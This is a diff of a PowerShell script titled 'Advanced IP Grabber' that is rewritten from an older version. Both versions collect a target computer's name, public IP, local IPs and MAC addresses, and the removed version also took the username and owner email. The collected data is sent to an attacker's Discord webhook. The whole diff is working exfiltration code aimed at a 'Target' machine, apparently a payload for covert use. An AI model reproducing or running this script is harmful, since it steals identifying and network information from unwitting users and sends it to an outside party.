@@ -1,51 +1,50 @@
-function Get-email {
+$webHookUrl = "$dc"
+$title = "Advanced IP Grabber"
+$targetPC = (Get-WmiObject -class Win32_ComputerSystem).Name
+$description = "Target: **$targetPC**"
+
+
+
+# Get the IP configuration for all adapters
+$ipConfig = Get-NetIPConfiguration
+
+# Set the values for the embed fields
+$fields = @()
+
+# Add the public IP to the fields array
+try{$publicIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content}
+catch{$publicIP="Error getting Public IP"}
+$fields += @{ name = "Public IP"; value = "*" + $publicIP + "*" }
+
+# Iterate through the adapters
+foreach ($adapter in $ipConfig.IPv4Address) {
+    # Get the local IP address
+    $localIP = $adapter.IPAddress
+
+    # Get the adapter name
+    $adapterName = $adapter.InterfaceAlias
+
+    # Get the MAC address of the adapter
+    $macAddress = (Get-NetAdapter -Name $adapterName).MacAddress
     
-    try {
-
-    $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
-    return $email
-    }
-
-# If no email is detected function will return backup message for sapi speak
-
-    # Write Error is just for troubleshooting
-    catch {Write-Error "An email was not found" 
-    return "No Email Detected"
-    -ErrorAction SilentlyContinue
-    }        
+    # Add the adapter information to the fields array
+    $adapterValue = "Local IP: *$localIP*`nMAC Address: *$macAddress*"
+    $fields += @{ name = $adapterName; value = $adapterValue}
 }
 
-$email = Get-email
+# Create the embed object
+$embed = @{
+    title       = $title
+    description = $description
+    fields      = $fields
+}
 
-#------------------------------------------------------------------------------------------------------------------------------------
+$payload = @{
+    "embeds" = @($embed)
+}
 
-try{$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content}
-catch{$computerPubIP="Error getting Public IP"}
+# Convert payload object to json
+$payload = ConvertTo-Json -InputObject $payload -Compress -Depth 10
 
-$localIPInterface = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias | Out-String
-$localIPAddress = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select IPAddress | Out-String
-$localIPOrigin = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select PrefixOrigin | Out-String
-
-$MACaddress = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select MacAddress | Out-String
-$MACname = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name | Out-String
-$MACstatus = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Status | Out-String
-
-#------------------------------------------------------------------------------------------------------------------------------------
-
-# Create a new embed object
-$Embed = New-Object -TypeName System.Object
-
-# Set the properties of the embed
-$Embed | Add-Member -MemberType NoteProperty -Name "title" -Value "IP Grabber Ran"
-$Embed | Add-Member -MemberType NoteProperty -Name "description" -Value "Target Username:\n`" + $env:UserName + "`\nTarget Device Name:\n`" + $env:ComputerName + "`"
-$Embed | Add-Member -MemberType NoteProperty -Name "color" -Value "16711680"
-
-# Convert the embed object to a JSON payload
-$Payload = @{
-    "embeds" = @($Embed)
-} | ConvertTo-Json
-
-Invoke-WebRequest -Method POST -Uri $WebhookURL -Body $Payload -ContentType "application/json"
-
-
-#------------------------------------------------------------------------------------------------------------------------------------
+# Use the Discord API to send the embed to a channel
+Invoke-RestMethod -Method "Post" -Uri $webHookUrl -Body $payload -ContentType 'application/json'
